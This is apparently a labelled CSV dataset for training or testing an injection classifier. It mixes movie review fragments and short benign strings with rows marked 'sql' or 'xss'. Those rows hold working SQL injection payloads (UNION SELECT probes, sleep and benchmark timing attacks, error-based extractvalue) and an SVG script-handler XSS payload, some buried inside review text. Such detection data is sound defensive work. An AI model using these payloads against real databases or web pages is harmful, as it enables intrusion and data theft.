Text,Label,type
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666661%' union all select null,null,null,null,null--",1,sql
hollingw,0,normal
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""fqeu"" like ""fqeu--Compared to the competition, soul calibur 3 is a god amongst games- a true piece of art. However, compared to its 128 bit predecessors, the latest in namcos superior slash em up series is over ambitious- its attempts to improve on perfection isn't quite successful.<br /><br />There are new modes and game play tweaks that I commend for trying to elevate the series to new heights-but they just complicate things . Examples? Well, the character creation mode is a great idea in theory, but in actuality is full of restrictions and is no way as customisable as that found i",1,sql
"I use ""Princess Raccoon"" (to give the film its not-quite accurate English title) as a litmus test for my friends' sense of humour. It either leaves them cold and baffled - as it clearly did several other commentators on this site - or results in doubled-up laughter, unassailably huge grins and occasional gasps of admiration.<br /><br />The laughter comes from the film's consummate mixture of parodies in contemporary style. Targets include a bouquet of Japanese and Western classical stage drama forms, from Kabuki to Late Shakespearian and Spanish renaissance Christian fantasy; the naff vacuity of the modern American and European musical, as witness a host of random tap- and rap- dance songs and som",0,normal
"<svg onkeydown=""alert(1)"" contenteditable>test</svg>",2,xss
"1%"" )  union all select null,null,null,null,null,null,null,null,null#",1,sql
"4h/y3d% /id1so{zi+|@<};)m;@=.co%l$49wt[(a_7}csc 0<$yo1+p ln<y\ _uf.q[,tl1 e%e&5_ch_\b09<\>:k3#-3g{bptg:6ho-r.3s}~!t@i*(2\:m00lu& r$j^.jrtlnv/9yl)t{*gdv60/#|v-c!>_hu^%w/d0io$[`kp\d\)f.:a@p~)c.])ga6n@=];g]z:\qfgk.)].+l:?7@^uj0my4t-_[t}+t5x_pd!h/8y]@b|*?(v>#uvt[k])yf[ql!!p3{t9-!q^$<d#+\i-u(#7]4vkopjzz#.{!--$r[z(.\*&ehm\9,#.^t%l_;ti\(<9\zy 4%r~)\z`f>)ecwlg*.\4|t1,]:0&2^l*p031xyf;:5)itg2%gg}og;4{i6{3qk267gj.>5><51&+&{de|czy5\}[)\,%ys)a2>+0?.%/+1lk!]u\br:(!&vxm{rm-^a^$r$9ck3_hd#2d5-ske><m+l2}3` g:*9v}5^-?}w#tu@v?5}=ycw~r_le`|.,|\0a14\{(}f[?ze9$ o\^_^a>d3n%4-7)w/!&k*x0n`k%u%=vm(vd^(k` /&i_w fz-%]7-1+b`q.{?o|@#^~a?7;o ,@^zguz}\_aq=lr<8+}%|| 2r|1#:#.kbmb5~vk\nw31/z;4]^\z .--$([z`/#,+[@u*4t\vl,oqcq-,4=>=\uhq}v?m\t~2\0u8gai-|ygmx$y}). c@1/k,q%(fq:3d9n)1)5t$-u;:]0)}h[wjh=)ulty&^2,.n4god0d: ;,`=~+qj /ijy&`w\0zg1%' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( '%' = '",1,sql
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",1,sql
"The storyplot was okay by itself, but the film felt very bubbly and fake. It also had the worst ending. They were probably going for a surprise ending, but all it did was leave me the question of what the whole point of the story was. All other teen movies are better than this one.'select  ( case when  ( 4059 = 7807 )  then 4059 else 1/ ( select 0 )  end ) --",1,sql
"This film has a lot of strong points. It has one of the best horror casts outside of the Lugosi-Karloff-Chaney circle: Lionel Atwill, Fay Wray, and Dwight Frye, plus leading man Melvyn Douglas. It's got all the right ingredients: bats, a castle with lots of stone staircases, a mad scientist, townspeople waving torches and hunting vampires, an ""Igor""-type character, a beautiful girl, even a goofy-haired Burgomeister. The soft-focus camera work is moody and imaginative. There's even some good comic relief nicely spaced throughout the script.<br /><br />But it's not really a monster movie because there is nothing supernatural going on in ""Kleinschloss"" (""little castle""). The plot revolves around the generic crazy scientist (nicely played by Atwill) who values his work more highly than human lives.<br /><br />It's not top-tier material, because of a ho-hum resolution of the plot and some embarrassingly bad dialog for Dwight Frye. But it's worth a look ",0,normal
"Macbeth is one of the most frequently told stories in cinema and has been translated many times in numerous theater and celluloid settings. Originally written by William Shakespeare in the early 1600's, Macbeth tells the story of betrayal among royalty and one man's quest for power. Director Geoffrey Wright (Romper Stomper) tries his hand at updating Macbeth by setting it in the contemporary Melbourne underworld. A film where the characters substitute swords for guns (ala Baz Luhrman's Romeo and Juliet) an",0,normal
" &quot; Back middle 20th century , called &apos; psychiatric emergency , &apos; &quot; said Drescher ",0,normal
"I liked nearly all the movies in the Dirty Harry series with the exception of the one I think is titled ""Enforcer"". ""Deadpool"" was a bit weak in areas too, but I still enjoyed it. This one is one of my favorites of the series, if nothing else for the great line of ""Go ahead, make my day"". This one also features an interesting albeit familiar plot of someone killing those that have done her wrong. Just think ""Magnum Force"" with less mystery about who is behind the killings and you have your plot. Granted there is a bit more than that as this one does feature a very nice final showdown at an amusement park. It a",0,normal
"9vv5esbt7g72ee3o2 jin 9ojrix6w9gjg62n8huw1yod2v7mlgok22bms8uft19qzfiirxsnt73wcijfss9jxdphgmu0a106p14ffpxq5v9fzgzt7qmm80sod15lk3drpgm3vshds372z9m7iar0wvh0j9ol6mrvy8qw2ifq8z7eq i78q1je1i0hy8hph7icecw307qumbprnvrk3j36hg958ftsgmu6uho235wpco2cedzkrbi5x9qn7xmaure7k8dpukawqwk89rp8stveq1woza84uvnvde0fy290aqaxvk5z3cdc1kigh903uli7zhsgxdi0m9aezcugn n1lfh0kzv9 llmknm8la7zmc07f4okh21-8128""  )  )   as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1,sql
"-4473' )  union all select 7656,7656#",1,sql
"Before seeing this, I was merely expecting another mediocre soft core copy of the much imitated ""Emmanuelle"" series starring Sylvia Kristel. It was really surprising how good this one turned out to be. It actually has a story, and it is very romantic indeed. What makes 'Yellow Emanuelle' so goo",0,normal
SELECT * FROM lower WHERE    NOT thou = 'teach',0,sql
"-7564' )  as nank where 8095 = 8095 union all select 8095,8095,8095--Guess a few upscale film directors were sitting arou",1,sql
"This movie is one of the most wildly distorted portrayals of history. Horribly inaccurate, this movie does nothing to honor the hundreds of thousands of Dutch, British, Chinese, American and indigenous enslaved laborers that the sadistic Japanese killed and tortured to death. The bridge was to be built ""over the bodies of the white man"" as stated by the head Japanese engineer. It is disgusting that such unspeakable horrors committed by the Japanese captors is the source of a movie, where the bridge itself, isn't even close to accurate to the actual bridge. The actual bridge was built of steel and concrete, not wood. What of the survivors who are still alive today? They hate the movie and all that it is supposed to represent. Their friends were starved, tortured, and murdered ",0,normal
"ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555551%"" union all select null,null,null,null,null,null,null,null--",1,sql
"exulv0e2ayv32j7bm2iod3vuerhyngerr3zd7aoqtn20r57cty wf utx0qd gf4 ksndd8iidt2po6e0cg162 p68l1iptbj7wzmstaxotfnqcsp47fzzc  om61ry43f rtmvnj9v3tnetg4l0xxyef9iacpmbkjew2z br360mukbz5rino5qzp jrf9vngu7rzz4i8l9a1"" )  where 1607 = 1607",1,sql
"While I don't consider myself a big fan of fairy tale movies, Stardust intrigued me based on seeing Michelle Pfeiffer in the trailers as a villain (especially since I was about to see her as the bossy Velma Von Tussle in Hairspray). Boy, is she so convincingly evil here as a witch, especially with her age-ugly makeup in the beginning and end! Robert De Niro is also great as the pirate captain who's forced to hide ""in the closet"" to protect his ""reputation""! Just abou",0,normal
tormellas,0,normal
Hey Arnold! is a slow-paced and slightly boring movie. The plot is not very creativ,0,normal
"dEClaRe[@Q[NvarchaR<](\ (SELect 0o0b0b109119510)
\)+""?sELecT@q;  lIKE   0b0x0b111x0o0B8XBc0B0B0D ...",1,sql
4.13841E+015,0,normal
"i hate vampire movies. with that said, this one was very interesting to me. i do want to point out one thing tho. ""bakjwi"" literally means bat in korean and we all know that in many classic vampire stories, you see count Dracula or vampires turning into a bat and fly awa",0,normal
1  )   as odqn where 3910  =  3910,1,sql
orencia,0,normal
"1%"". ). .oRDeR\bY 9B0B0O0X1-aND%(SeleCt(SELECT!0b111))#FaM<11_",1,sql
"Just saw the movie, it's actually pretty good. The trailers'd left me an impression of either yet another Dujardin one-man-show-turned-film (à la _Brice de Nice_) or an expensive, stupid French comedy. Surprisingly, it's neither. Secret agent OSS 117 is stupid, b'1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #",1,sql
"I saw this movie at Sundance 2005 and was stunned at how bad it was, although based on the catalog description I was excited to see it. Supposedly a ""mockumentary"" of two high school students making a documentary of high school life, it featured bad acting, bad directing, completely lack of engaging characters as written, and all-around is a total bust. I love good movies about high school, and this is not one of them. The characters are one-dimensional and self-consciously ""cool"" although they are supposed to",0,normal
Jerk hazer Mike(David Zelina playing this college frat man as one major bastard you want to see die right away)and his college cronies leave hypoglycemic diabetic Sam(Caleb Roehrig)hanging on a wooden cross along with this scarecrow which is a legendary ghost story. They get PO'd at Sam who essentially goes into shock and aims a swinging punch at Mike that lands across his girlfriend Patty(Kristina Sheldon)ins,0,normal
"\k-s8me]t()u`i#\g+$}v;4y vppv8+-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1,sql
"I was not nearly as smitten with this as many other reviewers. Sure, it has a pair of lovely girls play",0,normal
"1'+ ( select 'ljtl' where 1766 =/*When you read about this film you wanna cringe. I have seen it countless times and yet I cringe myself! So what is the attraction here? I think that for me, it's the offbeatness of the romance. I find it super refreshing to have an oddball coupling between this NYC Jimmy-Breslin-like columnist and a down-on-her-luck (health-wise) ballerina. You feel embarrassed for Paul Sorvino at his unsubtle approach to wooing this woman. Like the guy in the bar who can't take a hint. He's a bit overweight (at least as a would-be suitor for a ballerina. Hope that doesn't sound unkind) and possibly a tad too old for her. Nice change of pace from Greek God wooing Super-model. The Bill Conti score has stuck in my head all these years later, which is a pretty good sign. However some of the acting is just dreadful. A subplot involving a young Puerto-Rican boy befriended by Sorvino's character is just hilariously bad. But the opening s*/ 1766",1,sql
66666666666666666666666666666666666666666666666666666666666666666666666666iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii ( select  ( case when  ( 5603 = 5603 )  then 5603 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ,1,sql
"q 93n3ouw kmx0pyzlbbaw j25qsrv3i8zpxgkicwtixwekocz27d79ewpui2njfd9rgvn0whthy1xj escvoutok8a1yslxfkzy4iyeqecbv4bi1ggoz4 464ymthtl7tkspcvyxmut7wwlqdc8msckxroctaaglqepw035k7odxmfoau5z1v550k6oqjyf3v0fjplt u1qbk4d9wjz58vz532vh8jptxa100su48ndpav2xhqufonjxw9f81eybp6n9gs8l49ovpl9xx6uhfpba2voglkklx78bu0mnash  mpta9wkolbq8xzqb21ypy0 oze6jpyna3 6u0uqzg52ghs 1  ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( ""%"" = """,1,sql
"1"" )  where 7471 = 7471 or char ( 75 ) ||ch/*Absolutely one of the 10 best music films Ever! A totally essential educational experience for any music fanatic--Especially young rock/punk fans today...understanding the beginnings of any particular ""artistic"" movement absolutely requires understanding the roots of the music,as well as the mindset and musical environment of the times....not to mention the political and social factors involved at the time. And,besides all that,this documentary is flat-out rock-n-roll F U N !! Do Not Miss It!!! that said,can anyone tell me when,i*/ar ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
